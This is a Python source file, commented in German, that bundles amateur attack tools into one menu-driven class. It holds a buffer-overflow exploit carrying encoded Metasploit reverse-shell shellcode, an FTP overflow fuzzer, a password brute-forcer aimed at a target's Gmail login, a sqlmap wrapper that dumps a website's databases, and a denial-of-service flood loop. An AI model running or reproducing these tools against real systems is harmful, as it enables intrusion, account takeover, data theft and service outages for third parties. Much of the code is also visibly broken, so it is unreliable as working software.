class MyTols ():

    def Bufer():
        # Hier Kann man Als Dos Attack Benutzen
        import sys, socket
        host = sys.argv[1]
        buffer = "\x90" * 20

        # ./msfpayload windows/meterpreter/reverse_tcp LHOST=IP R | ./msfencode -e x86/alpha_mixed -t c #size 643 byte

        buffer += ("\x89\xe1\xd9\xce\xd9\x71\xf4\x59\x49\x49\x49\x49\x49\x49\x49"
                   "\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
                   "\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
                   "\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x49"
                   "\x6c\x49\x78\x4c\x49\x47\x70\x43\x30\x47\x70\x45\x30\x4f\x79"
                   "\x4a\x45\x50\x31\x49\x42\x45\x34\x4e\x6b\x42\x72\x50\x30\x4e"
                   "\x6b\x50\x52\x44\x4c\x4c\x4b\x51\x42\x47\x64\x4e\x6b\x51\x62"
                   "\x44\x68\x46\x6f\x4d\x67\x50\x4a\x51\x36\x45\x61\x4b\x4f\x44"
                   "\x71\x49\x50\x4c\x6c\x45\x6c\x50\x61\x43\x4c\x44\x42\x46\x4c"
                   "\x51\x30\x4a\x61\x4a\x6f\x44\x4d\x46\x61\x4a\x67\x4b\x52\x4a"
                   "\x50\x42\x72\x50\x57\x4c\x4b\x42\x72\x44\x50\x4e\x6b\x42\x62"
                   "\x45\x6c\x47\x71\x48\x50\x4c\x4b\x51\x50\x42\x58\x4b\x35\x49"
                   "\x50\x50\x74\x50\x4a\x47\x71\x48\x50\x50\x50\x4c\x4b\x43\x78"
                   "\x46\x78\x4e\x6b\x51\x48\x47\x50\x43\x31\x49\x43\x49\x73\x47"
                   "\x4c\x51\x59\x4c\x4b\x45\x64\x4c\x4b\x43\x31\x4b\x66\x44\x71"
                   "\x49\x6f\x50\x31\x4f\x30\x4e\x4c\x49\x51\x48\x4f\x46\x6d\x43"
                   "\x31\x4a\x67\x44\x78\x49\x70\x51\x65\x4a\x54\x45\x53\x51\x6d"
                   "\x4a\x58\x45\x6b\x43\x4d\x51\x34\x43\x45\x48\x62\x43\x68\x4e"
                   "\x6b\x46\x38\x51\x34\x43\x31\x4b\x63\x45\x36\x4e\x6b\x44\x4c"
                   "\x50\x4b\x4c\x4b\x43\x68\x47\x6c\x46\x61\x4e\x33\x4c\x4b\x44"
                   "\x44\x4c\x4b\x47\x71\x4a\x70\x4c\x49\x43\x74\x51\x34\x51\x34"
                   "\x43\x6b\x51\x4b\x50\x61\x42\x79\x51\x4a\x46\x31\x4b\x4f\x49"
                   "\x70\x46\x38\x43\x6f\x51\x4a\x4e\x6b\x42\x32\x48\x6b\x4d\x56"
                   "\x43\x6d\x50\x68\x46\x53\x46\x52\x45\x50\x43\x30\x43\x58\x43"
                   "\x47\x50\x73\x50\x32\x43\x6f\x42\x74\x45\x38\x50\x4c\x43\x47"
                   "\x46\x46\x47\x77\x49\x6f\x4b\x65\x4c\x78\x4e\x70\x45\x51\x47"
                   "\x70\x47\x70\x45\x79\x48\x44\x43\x64\x42\x70\x42\x48\x44\x69"
                   "\x4b\x30\x42\x4b\x47\x70\x4b\x4f\x48\x55\x50\x50\x46\x30\x46"
                   "\x30\x46\x30\x43\x70\x50\x50\x47\x30\x46\x30\x43\x58\x4a\x4a"
                   "\x44\x4f\x49\x4f\x49\x70\x4b\x4f\x4b\x65\x4a\x37\x50\x6a\x44"
                   "\x45\x43\x58\x4f\x30\x4e\x48\x47\x71\x44\x43\x45\x38\x45\x52"
                   "\x43\x30\x44\x51\x43\x6c\x4e\x69\x49\x76\x50\x6a\x42\x30\x50"
                   "\x56\x46\x37\x50\x68\x4a\x39\x4d\x75\x44\x34\x50\x61\x4b\x4f"
                   "\x4b\x65\x4f\x75\x4b\x70\x42\x54\x44\x4c\x4b\x4f\x42\x6e\x47"
                   "\x78\x44\x35\x4a\x4c\x43\x58\x4a\x50\x48\x35\x4d\x72\x43\x66"
                   "\x4b\x4f\x4a\x75\x50\x6a\x47\x70\x43\x5a\x45\x54\x46\x36\x43"
                   "\x67\x42\x48\x44\x42\x49\x49\x4f\x38\x51\x4f\x4b\x4f\x4b\x65"
                   "\x4e\x6b\x47\x46\x50\x6a\x51\x50\x42\x48\x45\x50\x42\x30\x43"
                   "\x30\x45\x50\x50\x56\x42\x4a\x45\x50\x42\x48\x51\x48\x4c\x64"
                   "\x46\x33\x4a\x45\x49\x6f\x4e\x35\x4a\x33\x43\x63\x42\x4a\x45"
                   "\x50\x46\x36\x43\x63\x50\x57\x50\x68\x44\x42\x48\x59\x4f\x38"
                   "\x43\x6f\x4b\x4f\x4e\x35\x43\x31\x48\x43\x51\x39\x4f\x36\x4c"
                   "\x45\x49\x66\x43\x45\x48\x6c\x4b\x73\x44\x4a\x41\x41")

        buffer += "\x90" * 294
        buffer += "\xe9\x4c\xfc\xff\xff"  # near jmp -----> shellcode
        buffer += "\xeb\xf9\x90\x90"  # short jmp ----> near jmp
        buffer += "\x95\x32\x9a\x0f"  # p/p/r(partial overwrite is not possible as far as i know)
        buffer += "\x41" * 1000  # play

        s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
        s.connect ( (host, 6660) )
        s.send ( "USV " + buffer + "\r\n\r\n" )

        s.close ()

    def FtpBuffer():

        # Note:Ich hab noch Nicht getestet
        # Einfacher Fuzzer für FTP Server
        import sys, socket, time
        host = str ( input ( "Enter a domain :" ) )  # Erhalte IP vom Benutzer
        port = 21  # FTP Port

        length = 100  # Anfangslänge von 100

        while (length, 3000):  # Stoppen Sie, sobald wir bis zu 3000 Länge versucht haben
            client = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )  # Erklären a TCP socket
            client.connect (
                (host, port) )  # Stellen Sie eine Verbindung zum vom Benutzer angegebenen Port und der IP-Adresse her
            client.recv ( 1024 )  # Erhalten Sie FTP-Banner
            client.send ( "USER " + "A" * length ).encode (
                'utf-8' )  # Senden Sie den Benutzerbefehl mit einem variablen Längennamen
            client.recv ( 1024 )  # Antwort erhalten
            client.send ( "PASS pass" )  # Sende den Pass, um den Verbindungsversuch abzuschließen(wird versagen)
            client.recv ( 1024 )  # Antwort erhalten
            client.close ()  # Schließen Sie die Verbindung
            time.sleep ( 2 )  # Sleep, um DoS-Abstürze zu verhindern
            print ( "Length Sent: " + str (
                length ) )  # Geben Sie den Benutzernamen der Länge aus, der an den Server gesendet wurde
            length += 100  # Versuchen Sie es erneut mit einer erhöhte Länge

        def HashMaster():
            import hashlib
            text = str ( input ( "Geben sie Ein Passwort oder Irgend Ein Text : " ) )
            hash_type = str ( input ( "Geben sie Ein hash type : " ) )
            text = text.encode ( 'utf-8' )
            hash_hash = hashlib.new ( hash_type )
            hash_hash.update ( text )
            hasher = hash_hash.hexdigest ()
            print ( hasher )

    def MailCracker():

        # Einfacher  Mail Craker

        import smtplib

        smtpserver = smtplib.SMTP ( "smtp.gmail.com", 587 )  # gmx.de Oder Einfach Ihre Smtp.Mail Addresse
        smtpserver.ehlo ()
        smtpserver.starttls ()
        user = str ( input ( "Enter th target's email : " ) )
        passwfile = input ( "Enter the password file : " )

        for password in passwfile:
            try:
                smtpserver.login ( user.password )
                print ( "[+] passwort gefoünd ==> %s" ) % password
                break
            except smtplib.OSError:  # oder SMTPAuthenticationError
                print ( "[#] Leider °|° ===> %s " ) % password

    def SqlScript():
        import os
        url = input ( 'Geben sie Ein Webseite ' )
        sqlmap1 = os.system ( 'sqlmap --url {} --dbs --random-agent'.format ( url ) )
        dbs = input ( "geben sie Ein DB " )
        sqlmap2 = os.system ( 'sqlmap --url {} -D {} --tables --random-agent'.format ( url, dbs ) )
        tabel1 = input ( 'Enter tab: ' )
        sqlmap3 = os.system ( 'sqlmap --url {} -D {} -T {} --columns --random-agent'.format ( url, dbs, tabel1 ) )
        colum = input ( 'Enter a columen: ' )
        sqlmap4 = os.system (
            'sqlmap --url {} -D {} -T {} -C {} --dump --random-agent'.format ( url, dbs, tabel1, colum ) )

    def dosAttack():
        # Simpel Dos Attack Script
        import os
        import sys
        import time
        import socket
        import random

        s = socket.socket ( socket.AF_INET, socket.SOCK_DGRAM )

        by = random._urandom ( 4024 )

        os.system ( "clear" )
        print ( "Willkommen bei DoS Attack ist nur zu lernen vorsicht " )

        print ( "*" * 75 )

        target = input ( "Geben Sie die IP-Adresse ein : " )

        port = input ( "Geben Sie Die Port  : " )
        duration = 1
        timeout = time.time () * duration
        sent = 0

        while True:
            try:
                if time.time == 1.0:
                    break
                else:
                    pass
                socket.create_connection ( (target, port) )
                # s.send((target,port)) nur in linux Platform
                sent = sent + 1
                print ( "Sent " )
            except KeyboardInterrupt:
                sys.exit ()

    def option():

        # options [5]=[Bufer(),MailCracker(),FtpBuffer(), HashPassword(),dosAttack()]

        b = Bufer ()
        m = MailCracker ()
        f = FtpBuffer ()
        h = HashPassword ()
        d = dosAttack ()
        s = SqlScript ()
        user = str ( input (
            "Geben sie Ein option \n b=(Buffer Pyload) \n m = (MailCracker): \n f=(FtpBuffer) \n h = (HashPassword ) \n d=(dosAttack) \n >>>" ) )

        if user == 'b':
            b = Bufer ()
            print ( "Welcommen im Buffer Pyload Sie Sollen auch Metasploit Benutzen >>" )
        elif user == 'm':
            m = MailCracker ()
            print ( "Welcommen Du Brauchst hier Ein Password List ;) " )
        elif user == 'f':
            f = FtpBuffer ()
            print ( "Welcommen Sie konnen auch als Dos Attack an Ftp protocol Benutzen " )
        elif user == 'h':
            print ( "Hier Kannst du Dein passwort Hashen Md5 u.s.w " )
            h = HashMaster ()
        elif user == 'd':
            print ( "Hier Kannst du Dos Attack benutzen aber Vorsiecht " )
            d = dosAttack ()
        elif user == 's':
            print ( "You Need A Sqlinjextion Be sure That Your Data bassis is Not some one Else" )
            s = SqlScript ()
        else:
            print ( "bye ......" )

    option ()
